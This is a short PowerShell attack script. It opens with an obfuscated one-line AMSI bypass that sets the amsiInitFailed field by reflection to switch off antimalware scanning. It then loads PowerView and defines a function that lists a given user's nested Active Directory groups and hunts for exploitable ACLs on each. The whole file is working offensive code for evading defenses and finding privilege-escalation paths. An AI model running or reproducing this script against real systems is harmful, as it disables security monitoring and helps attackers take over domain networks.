sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
Import-Module .\PowerView.ps1


# To-Do : 
# 1 - Find all nested groups of the user ===========> DONE
# 2 - Search for interesting ACLs for each group ===> DONE

$username = $args[0]
Function NestedGroupsACLs ($username)
{
    # 1 - Find the groups of the user, and save it into a list  - ( Note : Poweview enumerates groups recursively )
    $Groups = Get-DomainGroup -UserName $username
    # 2 - Search for interesting ACLs for each group 
    ForEach ($group in $Groups)
    {
        Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $group.name} | select IdentityReferencename,ActiveDirectoryRights,ObjectDN | Format-List
    } # END_FOR_EACH
} # END_FUNCTION

